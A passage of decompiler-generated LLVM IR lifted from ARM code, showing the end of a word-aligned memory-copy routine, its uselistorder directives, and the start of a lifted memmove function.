  %v4_fc80 = mul i32 %v5_fc64, 256
  %v5_fc80 = or i32 %v4_fc80, %v3_fc7c
  store i32 %v5_fc80, i32* %r5.global-to-local, align 4
  %v3_fc84 = udiv i32 %v5_fc64, 16777216
  %v4_fc88 = mul i32 %v8_fc64, 256
  %v5_fc88 = or i32 %v4_fc88, %v3_fc84
  store i32 %v5_fc88, i32* %r6.global-to-local, align 4
  %v3_fc8c = udiv i32 %v8_fc64, 16777216
  %v4_fc90 = mul i32 %v11_fc64, 256
  %v5_fc90 = or i32 %v4_fc90, %v3_fc8c
  store i32 %v5_fc90, i32* %r7.global-to-local, align 4
  %v3_fc94 = udiv i32 %v11_fc64, 16777216
  %v4_fc98 = mul i32 %v14_fc64, 256
  %v5_fc98 = or i32 %v4_fc98, %v3_fc94
  store i32 %v5_fc98, i32* %r8.global-to-local, align 4
  %v3_fc9c = udiv i32 %v14_fc64, 16777216
  %v4_fca0 = mul i32 %v17_fc64, 256
  %v5_fca0 = or i32 %v4_fca0, %v3_fc9c
  store i32 %v5_fca0, i32* %sb.global-to-local, align 4
  %v3_fca4 = udiv i32 %v17_fc64, 16777216
  %v4_fca8 = mul i32 %v20_fc64, 256
  %v5_fca8 = or i32 %v4_fca8, %v3_fca4
  store i32 %v5_fca8, i32* %sl.global-to-local, align 4
  %v1_fcac = inttoptr i32 %v0_fcac to i32*
  store i32 %v5_fc70, i32* %v1_fcac, align 4
  %v3_fcac = add i32 %v0_fcac, 4
  %v4_fcac = inttoptr i32 %v3_fcac to i32*
  %v5_fcac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_fcac, i32* %v4_fcac, align 4
  %v6_fcac = add i32 %v0_fcac, 8
  %v7_fcac = inttoptr i32 %v6_fcac to i32*
  %v8_fcac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_fcac, i32* %v7_fcac, align 4
  %v9_fcac = add i32 %v0_fcac, 12
  %v10_fcac = inttoptr i32 %v9_fcac to i32*
  %v11_fcac = load i32, i32* %r6.global-to-local, align 4
  store i32 %v11_fcac, i32* %v10_fcac, align 4
  %v12_fcac = add i32 %v0_fcac, 16
  %v13_fcac = inttoptr i32 %v12_fcac to i32*
  %v14_fcac = load i32, i32* %r7.global-to-local, align 4
  store i32 %v14_fcac, i32* %v13_fcac, align 4
  %v15_fcac = add i32 %v0_fcac, 20
  %v16_fcac = inttoptr i32 %v15_fcac to i32*
  %v17_fcac = load i32, i32* %r8.global-to-local, align 4
  store i32 %v17_fcac, i32* %v16_fcac, align 4
  %v18_fcac = add i32 %v0_fcac, 24
  %v19_fcac = inttoptr i32 %v18_fcac to i32*
  %v20_fcac = load i32, i32* %sb.global-to-local, align 4
  store i32 %v20_fcac, i32* %v19_fcac, align 4
  %v21_fcac = add i32 %v0_fcac, 28
  %v22_fcac = inttoptr i32 %v21_fcac to i32*
  %v23_fcac = load i32, i32* %sl.global-to-local, align 4
  store i32 %v23_fcac, i32* %v22_fcac, align 4
  %v24_fcac = add i32 %v0_fcac, 32
  store i32 %v24_fcac, i32* %r0.global-to-local, align 4
  %v0_fcb0 = load i32, i32* %fp.global-to-local, align 4
  %v1_fcb0 = and i32 %v0_fcb0, 8388608
  %v2_fcb0 = icmp eq i32 %v1_fcb0, 0
  %v3_fcb0 = udiv i32 %v0_fcb0, 16777216
  store i32 %v3_fcb0, i32* @r3, align 4
  br i1 %v2_fcb0, label %dec_label_pc_fcb8.loopexit, label %.dec_label_pc_fc60_crit_edge

.dec_label_pc_fc60_crit_edge:                     ; preds = %bb157
  %v0_fc60.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_fc64.pre = load i32, i32* @r1, align 4
  %v0_fc68.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fc60

dec_label_pc_fcb8.loopexit:                       ; preds = %bb157
  %v6_fc68.le = icmp slt i32 %v1_fc68, 0
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_fc68.le, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_fcb8

dec_label_pc_fcb8.loopexit17:                     ; preds = %bb155
  %v6_fc08.le = icmp slt i32 %v1_fc08, 0
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_fc08.le, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_fcb8

dec_label_pc_fcb8.loopexit18:                     ; preds = %bb153
  %v6_fba8.le = icmp slt i32 %v1_fba8, 0
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_fba8.le, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_fcb8

dec_label_pc_fcb8:                                ; preds = %dec_label_pc_fcb8.loopexit18, %dec_label_pc_fcb8.loopexit17, %dec_label_pc_fcb8.loopexit, %dec_label_pc_fb84
  %v1_fcd849 = phi i32 [ %v24_fbec, %dec_label_pc_fcb8.loopexit18 ], [ %v24_fc4c, %dec_label_pc_fcb8.loopexit17 ], [ %v24_fcac, %dec_label_pc_fcb8.loopexit ], [ %v0_fbec37, %dec_label_pc_fb84 ]
  %v0_fcb8 = load i32, i32* %lr.global-to-local, align 4
  %v1_fcb8 = sub i32 32, %v0_fcb8
  store i32 %v1_fcb8, i32* @ip, align 4
  %v0_fcbc = load i32, i32* %r2.global-to-local, align 4
  %v1_fcbc = add i32 %v0_fcbc, 32
  store i32 %v1_fcbc, i32* %r2.global-to-local, align 4
  %v1_fcc0 = add i32 %v0_fcbc, 28
  %v2_fcc0 = icmp ugt i32 %v1_fcbc, 3
  store i1 %v2_fcc0, i1* %cpsr_c.global-to-local, align 1
  %v6_fcc0 = icmp slt i32 %v1_fcc0, 0
  store i1 %v6_fcc0, i1* %cpsr_n.global-to-local, align 1
  %v3_fcc4 = icmp ult i32 %v1_fcbc, 2
  br i1 %v3_fcc4, label %dec_label_pc_fce4, label %dec_label_pc_fcc8

dec_label_pc_fcc8:                                ; preds = %dec_label_pc_fcb8, %dec_label_pc_fcc8.dec_label_pc_fcc8_crit_edge
  %v1_fcd8 = phi i32 [ %v4_fcd8, %dec_label_pc_fcc8.dec_label_pc_fcc8_crit_edge ], [ %v1_fcd849, %dec_label_pc_fcb8 ]
  %v1_fcd4 = phi i32 [ %v1_fcd4.pre, %dec_label_pc_fcc8.dec_label_pc_fcc8_crit_edge ], [ %v1_fcb8, %dec_label_pc_fcb8 ]
  %v2_fcd0 = phi i32 [ %v2_fcd0.pre, %dec_label_pc_fcc8.dec_label_pc_fcc8_crit_edge ], [ %v0_fcb8, %dec_label_pc_fcb8 ]
  %v0_fccc = phi i32 [ %v0_fcdc, %dec_label_pc_fcc8.dec_label_pc_fcc8_crit_edge ], [ %v1_fcbc, %dec_label_pc_fcb8 ]
  %v0_fcc8 = load i32, i32* @r1, align 4
  %v1_fcc8 = inttoptr i32 %v0_fcc8 to i32*
  %v2_fcc8 = load i32, i32* %v1_fcc8, align 4
  store i32 %v2_fcc8, i32* %r5.global-to-local, align 4
  %v4_fcc8 = add i32 %v0_fcc8, 4
  store i32 %v4_fcc8, i32* @r1, align 4
  %v1_fccc = add i32 %v0_fccc, -4
  store i32 %v1_fccc, i32* %r2.global-to-local, align 4
  %v0_fcd0 = load i32, i32* @r3, align 4
  %v7_fcd0 = shl i32 %v2_fcc8, %v2_fcd0
  %v8_fcd0 = or i32 %v0_fcd0, %v7_fcd0
  store i32 %v8_fcd0, i32* %r4.global-to-local, align 4
  %v6_fcd4 = lshr i32 %v2_fcc8, %v1_fcd4
  store i32 %v6_fcd4, i32* @r3, align 4
  %v2_fcd8 = inttoptr i32 %v1_fcd8 to i32*
  store i32 %v8_fcd0, i32* %v2_fcd8, align 4
  %v3_fcd8 = load i32, i32* %r0.global-to-local, align 4
  %v4_fcd8 = add i32 %v3_fcd8, 4
  store i32 %v4_fcd8, i32* %r0.global-to-local, align 4
  %v0_fcdc = load i32, i32* %r2.global-to-local, align 4
  %v2_fcdc = icmp ugt i32 %v0_fcdc, 3
  br i1 %v2_fcdc, label %dec_label_pc_fcc8.dec_label_pc_fcc8_crit_edge, label %dec_label_pc_fce4.loopexit

dec_label_pc_fcc8.dec_label_pc_fcc8_crit_edge:    ; preds = %dec_label_pc_fcc8
  %v2_fcd0.pre = load i32, i32* %lr.global-to-local, align 4
  %v1_fcd4.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_fcc8

dec_label_pc_fce4.loopexit:                       ; preds = %dec_label_pc_fcc8
  %v1_fcdc = add i32 %v0_fcdc, -4
  %v6_fcdc = icmp slt i32 %v1_fcdc, 0
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_fcdc, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_fce4

dec_label_pc_fce4:                                ; preds = %dec_label_pc_fce4.loopexit, %dec_label_pc_fcb8, %dec_label_pc_fb80, %.thread9
  %v3_fce8 = phi i32 [ %v4_fcd8, %dec_label_pc_fce4.loopexit ], [ %v1_fcd849, %dec_label_pc_fcb8 ], [ %v4_fb74, %dec_label_pc_fb80 ], [ %v0_fb5c30, %.thread9 ]
  %v0_fce4 = load i32, i32* %lr.global-to-local, align 4
  %v1_fce4 = and i32 %v0_fce4, 16
  %v2_fce4 = icmp ne i32 %v1_fce4, 0
  store i1 %v2_fce4, i1* %cpsr_c.global-to-local, align 1
  %v3_fce4 = mul i32 %v0_fce4, 268435456
  store i32 %v3_fce4, i32* %r5.global-to-local, align 4
  %v4_fce4 = icmp slt i32 %v3_fce4, 0
  store i1 %v4_fce4, i1* %cpsr_n.global-to-local, align 1
  br i1 %v4_fce4, label %bb158, label %thread-pre-split11

bb158:                                            ; preds = %dec_label_pc_fce4
  %v1_fce8 = load i32, i32* @r3, align 4
  %v2_fce8 = trunc i32 %v1_fce8 to i8
  %v4_fce8 = inttoptr i32 %v3_fce8 to i8*
  store i8 %v2_fce8, i8* %v4_fce8, align 1
  %v5_fce8 = load i32, i32* %r0.global-to-local, align 4
  %v6_fce8 = add i32 %v5_fce8, 1
  store i32 %v6_fce8, i32* %r0.global-to-local, align 4
  %v0_fcec.pr = load i1, i1* %cpsr_n.global-to-local, align 1
  br i1 %v0_fcec.pr, label %bb159, label %.thread-pre-split11_crit_edge

.thread-pre-split11_crit_edge:                    ; preds = %bb158
  %v0_fcf0.pr.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fcf0.pr.pre, label %thread-pre-split11._crit_edge, label %.thread14

thread-pre-split11:                               ; preds = %dec_label_pc_fce4
  br i1 %v2_fce4, label %thread-pre-split11._crit_edge, label %.thread14

thread-pre-split11._crit_edge:                    ; preds = %.thread-pre-split11_crit_edge, %thread-pre-split11
  %v3_fcf055114 = phi i32 [ %v6_fce8, %.thread-pre-split11_crit_edge ], [ %v3_fce8, %thread-pre-split11 ]
  %v1_fcf0.pre = load i32, i32* @r3, align 4
  %extract.t83 = trunc i32 %v1_fcf0.pre to i8
  br label %bb160

bb159:                                            ; preds = %bb158
  %v1_fcec = load i32, i32* @r3, align 4
  %v2_fcec = and i32 %v1_fcec, 128
  %v3_fcec = icmp ne i32 %v2_fcec, 0
  store i1 %v3_fcec, i1* %cpsr_c.global-to-local, align 1
  %v4_fcec = udiv i32 %v1_fcec, 256
  store i32 %v4_fcec, i32* @r3, align 4
  %extract.t84 = trunc i32 %v4_fcec to i8
  br i1 %v3_fcec, label %bb160, label %.thread14

bb160:                                            ; preds = %thread-pre-split11._crit_edge, %bb159
  %v3_fcf0 = phi i32 [ %v3_fcf055114, %thread-pre-split11._crit_edge ], [ %v6_fce8, %bb159 ]
  %v1_fcf0.off0 = phi i8 [ %extract.t83, %thread-pre-split11._crit_edge ], [ %extract.t84, %bb159 ]
  %v4_fcf0 = inttoptr i32 %v3_fcf0 to i8*
  store i8 %v1_fcf0.off0, i8* %v4_fcf0, align 1
  %v5_fcf0 = load i32, i32* %r0.global-to-local, align 4
  %v6_fcf0 = add i32 %v5_fcf0, 1
  store i32 %v6_fcf0, i32* %r0.global-to-local, align 4
  %v0_fcf4.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fcf4.pr, label %bb161, label %.thread14

bb161:                                            ; preds = %bb160
  %v1_fcf4 = load i32, i32* @r3, align 4
  %v2_fcf4 = and i32 %v1_fcf4, 128
  %v3_fcf4 = icmp ne i32 %v2_fcf4, 0
  store i1 %v3_fcf4, i1* %cpsr_c.global-to-local, align 1
  %v4_fcf4 = udiv i32 %v1_fcf4, 256
  store i32 %v4_fcf4, i32* @r3, align 4
  br i1 %v3_fcf4, label %bb162, label %.thread14

bb162:                                            ; preds = %bb161
  %v2_fcf8 = trunc i32 %v4_fcf4 to i8
  %v4_fcf8 = inttoptr i32 %v6_fcf0 to i8*
  store i8 %v2_fcf8, i8* %v4_fcf8, align 1
  %v5_fcf8 = load i32, i32* %r0.global-to-local, align 4
  %v6_fcf8 = add i32 %v5_fcf8, 1
  store i32 %v6_fcf8, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %.thread-pre-split11_crit_edge, %bb159, %thread-pre-split11, %bb160, %bb161, %bb162
  %v3_fd1077 = phi i32 [ %v6_fce8, %bb159 ], [ %v3_fce8, %thread-pre-split11 ], [ %v6_fcf0, %bb160 ], [ %v6_fcf0, %bb161 ], [ %v6_fcf8, %bb162 ], [ %v6_fce8, %.thread-pre-split11_crit_edge ]
  %v2_fcfc = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_fcfc, i32* @r5, align 4
  store i32 %v5_fb1c, i32* @r6, align 4
  store i32 %v8_fb1c, i32* @r7, align 4
  store i32 %v11_fb1c, i32* @r8, align 4
  store i32 %v14_fb1c, i32* @sb, align 4
  store i32 %v17_fb1c, i32* @sl, align 4
  store i32 %v20_fb1c, i32* @fp, align 4
  %v0_fd00.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fd00

dec_label_pc_fd00:                                ; preds = %dec_label_pc_fb14, %entry, %.thread14
  %v3_fd10 = phi i32 [ %v1_fa90, %dec_label_pc_fb14 ], [ %v3_fa24, %entry ], [ %v3_fd1077, %.thread14 ]
  %v0_fd00 = phi i32 [ %v0_fb14, %dec_label_pc_fb14 ], [ %v0_fa2c, %entry ], [ %v0_fd00.pre, %.thread14 ]
  %v1_fd00 = and i32 %v0_fd00, 2
  %v2_fd00 = icmp ne i32 %v1_fd00, 0
  store i1 %v2_fd00, i1* %cpsr_c.global-to-local, align 1
  %v3_fd00 = shl i32 %v0_fd00, 31
  store i32 %v3_fd00, i32* @r2, align 4
  %v4_fd00 = icmp ne i32 %v3_fd00, 0
  store i1 %v4_fd00, i1* %cpsr_n.global-to-local, align 1
  br i1 %v4_fd00, label %bb163, label %bb164

bb163:                                            ; preds = %dec_label_pc_fd00
  %v1_fd04 = load i32, i32* @r1, align 4
  %v2_fd04 = inttoptr i32 %v1_fd04 to i8*
  %v3_fd04 = load i8, i8* %v2_fd04, align 1
  %v4_fd04 = zext i8 %v3_fd04 to i32
  store i32 %v4_fd04, i32* @r2, align 4
  %v6_fd04 = add i32 %v1_fd04, 1
  store i32 %v6_fd04, i32* @r1, align 4
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_fd00, %bb163
  %v1_fd10.off0 = phi i8 [ 0, %dec_label_pc_fd00 ], [ %v3_fd04, %bb163 ]
  br i1 %v2_fd00, label %bb165, label %.thread15

bb165:                                            ; preds = %bb164
  %v1_fd08 = load i32, i32* @r1, align 4
  %v2_fd08 = inttoptr i32 %v1_fd08 to i8*
  %v3_fd08 = load i8, i8* %v2_fd08, align 1
  %v4_fd08 = zext i8 %v3_fd08 to i32
  store i32 %v4_fd08, i32* @r3, align 4
  %v6_fd08 = add i32 %v1_fd08, 1
  store i32 %v6_fd08, i32* @r1, align 4
  %v2_fd0c = inttoptr i32 %v6_fd08 to i8*
  %v3_fd0c = load i8, i8* %v2_fd0c, align 1
  %v4_fd0c = zext i8 %v3_fd0c to i32
  store i32 %v4_fd0c, i32* @ip, align 4
  br label %.thread15

.thread15:                                        ; preds = %bb164, %bb165
  br i1 %v4_fd00, label %bb166, label %bb167

bb166:                                            ; preds = %.thread15
  %v4_fd10 = inttoptr i32 %v3_fd10 to i8*
  store i8 %v1_fd10.off0, i8* %v4_fd10, align 1
  %v5_fd10 = load i32, i32* %r0.global-to-local, align 4
  %v6_fd10 = add i32 %v5_fd10, 1
  store i32 %v6_fd10, i32* %r0.global-to-local, align 4
  %v0_fd14.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fd14.pre, label %bb168, label %.thread16

bb167:                                            ; preds = %.thread15
  br i1 %v2_fd00, label %bb168, label %.thread16

bb168:                                            ; preds = %bb166, %bb167
  %v3_fd14115 = phi i32 [ %v6_fd10, %bb166 ], [ %v3_fd10, %bb167 ]
  %v1_fd14 = load i32, i32* @r3, align 4
  %v2_fd14 = trunc i32 %v1_fd14 to i8
  %v4_fd14 = inttoptr i32 %v3_fd14115 to i8*
  store i8 %v2_fd14, i8* %v4_fd14, align 1
  %v5_fd14 = load i32, i32* %r0.global-to-local, align 4
  %v6_fd14 = add i32 %v5_fd14, 1
  store i32 %v6_fd14, i32* %r0.global-to-local, align 4
  %v0_fd18.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fd18.pr, label %bb169, label %.thread16

bb169:                                            ; preds = %bb168
  %v1_fd18 = load i32, i32* @ip, align 4
  %v2_fd18 = trunc i32 %v1_fd18 to i8
  %v4_fd18 = inttoptr i32 %v6_fd14 to i8*
  store i8 %v2_fd18, i8* %v4_fd18, align 1
  br label %.thread16

.thread16:                                        ; preds = %bb166, %bb167, %bb168, %bb169
  store i32 %v3_fa24, i32* %r0.global-to-local, align 4
  store i32 %v8_fa24, i32* @r4, align 4
  store i32 %v11_fa24, i32* @lr, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  ret i32 %v3_fa24

; uselistorder directives
  uselistorder i32 %v4_fcf4, { 1, 0 }
  uselistorder i32 %v4_fcec, { 1, 0 }
  uselistorder i32 %v6_fce8, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_fce4, { 1, 0 }
  uselistorder i32 %v0_fcdc, { 0, 2, 1 }
  uselistorder i32 %v4_fcd8, { 0, 2, 1 }
  uselistorder i32 %v2_fcc8, { 1, 0, 2 }
  uselistorder i32 %v1_fcd849, { 1, 0 }
  uselistorder i32 %v24_fcac, { 0, 2, 1 }
  uselistorder i32 %v17_fc64, { 1, 0, 2 }
  uselistorder i32 %v14_fc64, { 1, 0, 2 }
  uselistorder i32 %v11_fc64, { 1, 0, 2 }
  uselistorder i32 %v8_fc64, { 1, 0, 2 }
  uselistorder i32 %v5_fc64, { 1, 0, 2 }
  uselistorder i32 %v2_fc64, { 1, 0, 2 }
  uselistorder i32 %v1_fc70, { 1, 0, 2 }
  uselistorder i32 %v0_fc64, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_fc68, { 1, 0 }
  uselistorder i32 %v0_fcac, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v24_fc4c, { 0, 2, 1 }
  uselistorder i32 %v17_fc04, { 1, 0, 2 }
  uselistorder i32 %v14_fc04, { 1, 0, 2 }
  uselistorder i32 %v11_fc04, { 1, 0, 2 }
  uselistorder i32 %v8_fc04, { 1, 0, 2 }
  uselistorder i32 %v5_fc04, { 1, 0, 2 }
  uselistorder i32 %v2_fc04, { 1, 0, 2 }
  uselistorder i32 %v1_fc10, { 1, 0, 2 }
  uselistorder i32 %v0_fc04, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_fc08, { 1, 0 }
  uselistorder i32 %v0_fc4c, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v24_fbec, { 0, 2, 1 }
  uselistorder i32 %v17_fba4, { 1, 0, 2 }
  uselistorder i32 %v14_fba4, { 1, 0, 2 }
  uselistorder i32 %v11_fba4, { 1, 0, 2 }
  uselistorder i32 %v8_fba4, { 1, 0, 2 }
  uselistorder i32 %v5_fba4, { 1, 0, 2 }
  uselistorder i32 %v2_fba4, { 1, 0, 2 }
  uselistorder i32 %v1_fbb0, { 1, 0, 2 }
  uselistorder i32 %v0_fba4, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_fba8, { 1, 0 }
  uselistorder i32 %v0_fbec, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_fb8c, { 0, 2, 1, 5, 3, 4 }
  uselistorder i32 %v1_fb84, { 2, 0, 1, 3, 5, 4 }
  uselistorder i32 %v0_fb84, { 1, 0 }
  uselistorder i32 %v0_fbec37, { 2, 3, 0, 1 }
  uselistorder i32 %v0_fb78, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_fb74, { 0, 1, 3, 2 }
  uselistorder i32 %v0_fb5c30, { 1, 0 }
  uselistorder i32 %v4_fb48, { 1, 0 }
  uselistorder i32 %v4_fb40, { 1, 0 }
  uselistorder i32 %v6_fb3c, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_fb28, { 1, 0 }
  uselistorder i32 %v1_fb20, { 1, 2, 0 }
  uselistorder i32 %v3_fae4, { 1, 0, 2 }
  uselistorder i1 %v4_fae0, { 1, 0, 2 }
  uselistorder i32 %v3_fae0, { 1, 0 }
  uselistorder i32 %v2_faec, { 0, 1, 3, 2 }
  uselistorder i32 %v1_fadc96, { 2, 1, 0 }
  uselistorder i32 %v13_fad8, { 1, 0, 2 }
  uselistorder i32 %v1_fad4, { 2, 1, 0 }
  uselistorder i1 %v4_facc, { 0, 2, 1, 3 }
  uselistorder i32 %v3_facc, { 1, 0 }
  uselistorder i32 %v0_facc, { 0, 2, 1 }
  uselistorder i32 %v1_fad8, { 1, 0, 6, 5, 4, 3, 2 }
  uselistorder i32 %v24_fab8, { 0, 2, 1 }
  uselistorder i32 %v0_fab4, { 1, 0 }
  uselistorder i32 %v0_fab8, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_faa8, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v0_faa8, { 1, 0 }
  uselistorder i32 %v0_fab863, { 1, 0 }
  uselistorder i32 %v1_fa9491, { 2, 1, 0 }
  uselistorder i32 %v13_fa90, { 1, 0, 2 }
  uselistorder i32 %v1_fa8c, { 2, 1, 0 }
  uselistorder i1 %v4_fa84, { 0, 2, 1, 3 }
  uselistorder i32 %v3_fa84, { 1, 0 }
  uselistorder i32 %v0_faa8.pre, { 1, 4, 0, 3, 2 }
  uselistorder i32 %v1_fa74, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v1_fa60, { 8, 7, 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 %v1_fa90, { 6, 3, 0, 13, 14, 2, 5, 4, 11, 10, 9, 8, 7, 12, 1 }
  uselistorder i32 %v6_fa54, { 1, 0, 2 }
  uselistorder i32 %v1_fa4c, { 0, 2, 1 }
  uselistorder i32 %v1_fa38, { 3, 2, 1, 0 }
  uselistorder i32 %v1_fa34, { 1, 2, 0 }
  uselistorder i32 %v0_fa34, { 0, 2, 1, 3 }
  uselistorder i32 %v11_fa24, { 1, 0 }
  uselistorder i32 %v8_fa24, { 2, 1, 0 }
  uselistorder i32 %v3_fa24, { 2, 3, 7, 0, 1, 6, 4, 5, 8 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12 }
  uselistorder i32* %r4.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 23, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12, 13, 14, 24, 25, 21, 16, 15, 17, 18, 20, 19, 22, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 38, 6, 39, 7, 8, 9, 40, 10, 41, 11, 42, 12, 13, 14, 15, 43, 35, 36, 37, 44, 45, 33, 16, 17, 29, 18, 30, 3, 28, 19, 20, 21, 22, 31, 23, 24, 25, 26, 27, 32, 34, 0, 1, 2 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 4, 3, 6, 7, 5, 8, 10, 9, 11 }
  uselistorder i1* %cpsr_n.global-to-local, { 7, 8, 9, 10, 6, 11, 3, 2, 1, 12, 13, 14, 4, 0, 30, 31, 32, 15, 16, 17, 18, 19, 20, 5, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i1* %cpsr_c.global-to-local, { 6, 5, 7, 8, 11, 9, 10, 12, 4, 13, 2, 1, 0, 14, 15, 16, 17, 28, 29, 30, 31, 34, 32, 33, 35, 18, 19, 20, 3, 21, 22, 23, 25, 24, 26, 27 }
  uselistorder label %.thread16, { 3, 2, 1, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %.thread15, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_fd00, { 2, 0, 1 }
  uselistorder label %.thread14, { 5, 4, 3, 1, 2, 0 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %thread-pre-split11._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_fcc8, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb155, { 1, 0 }
  uselistorder label %dec_label_pc_fc00, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_fba0, { 1, 0 }
  uselistorder label %dec_label_pc_fb5c, { 1, 0 }
  uselistorder label %.thread9, { 6, 5, 4, 1, 2, 3, 0 }
  uselistorder label %bb149, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread107, { 2, 1, 0 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %.thread97, { 2, 1, 0 }
  uselistorder label %bb141, { 1, 0 }
  uselistorder label %dec_label_pc_fac4, { 1, 0 }
  uselistorder label %dec_label_pc_fab0, { 1, 0 }
  uselistorder label %dec_label_pc_faa8, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %.thread92, { 2, 1, 0 }
  uselistorder label %bb134, { 1, 0 }
  uselistorder label %.thread1, { 4, 3, 1, 0, 2 }
  uselistorder label %bb131, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb127, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp21 = ptrtoint i8* %arg1 to i32
  %v3_fd30 = load i32, i32* @r4, align 4
  %v6_fd30 = load i32, i32* @r5, align 4
  %v9_fd30 = load i32, i32* @r6, align 4
  %v12_fd30 = load i32, i32* @r7, align 4
  %v15_fd30 = load i32, i32* @lr, align 4
  %v5_fd34 = icmp ugt i8* %tmp, %arg1
  %v11_fd34 = icmp eq i8* %tmp, %arg1
  store i1 %v11_fd34, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp21, i32* @r5, align 4
  store i32 %arg2, i32* @lr, align 4
  %v0_fd44 = load i32, i32* @r2, align 4
  store i32 %v0_fd44, i32* @ip, align 4
  store i32 %tmp21, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v11_fd34, label %dec_label_pc_fd74, label %dec_label_pc_fd54

dec_label_pc_fd54:                                ; preds = %entry
  %v3_fd54 = add i32 %v0_fd44, %arg2
  store i32 %v3_fd54, i32* @r3, align 4
  %v4_fd58 = icmp ult i32 %tmp21, %v3_fd54
  %v10_fd58 = icmp eq i32 %tmp21, %v3_fd54
  store i1 %v10_fd58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_fd58, label %dec_label_pc_fd60, label %dec_label_pc_fd6c

dec_label_pc_fd60:                                ; preds = %dec_label_pc_fd54
  %v3_fd60 = add i32 %v0_fd44, %tmp21
  store i32 %v3_fd60, i32* @r7, align 4
  %v4_fd64 = icmp ugt i32 %v3_fd60, %arg2
  %v10_fd64 = icmp eq i32 %v3_fd60, %arg2
  store i1 %v10_fd64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_fd64, label %dec_label_pc_fd84, label %dec_label_pc_fd6c

dec_label_pc_fd6c:                                ; preds = %dec_label_pc_fd60, %dec_label_pc_fd54
  %tmp29 = bitcast i8* %arg1 to i16*
  %v6_fd6c = call i32 @memcpy(i16* %tmp29, i32 %arg2, i32 %v0_fd44)
  store i32 %v6_fd6c, i32* @r5, align 4
  br label %dec_label_pc_fd74

dec_label_pc_fd74:                                ; preds = %dec_label_pc_fe00, %dec_label_pc_fdf0, %dec_label_pc_fe44, %dec_label_pc_fda4, %dec_label_pc_fdd0, %dec_label_pc_fdc8, %dec_label_pc_fd9c, %entry, %dec_label_pc_fd6c
  %v0_fd74 = load i32, i32* @r5, align 4
  store i32 %v3_fd30, i32* @r4, align 4
  store i32 %v6_fd30, i32* @r5, align 4
  store i32 %v9_fd30, i32* @r6, align 4
  store i32 %v12_fd30, i32* @r7, align 4
  store i32 %v15_fd30, i32* @lr, align 4
  ret i32 %v0_fd74

dec_label_pc_fd84:                                ; preds = %dec_label_pc_fd60
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  %v2_fdb8 = urem i32 %arg2, 4
  br i1 %v5_fd34, label %dec_label_pc_fd8c, label %dec_label_pc_fdb8

dec_label_pc_fd8c:                                ; preds = %dec_label_pc_fd84
  %v2_fd90 = urem i32 %tmp21, 4
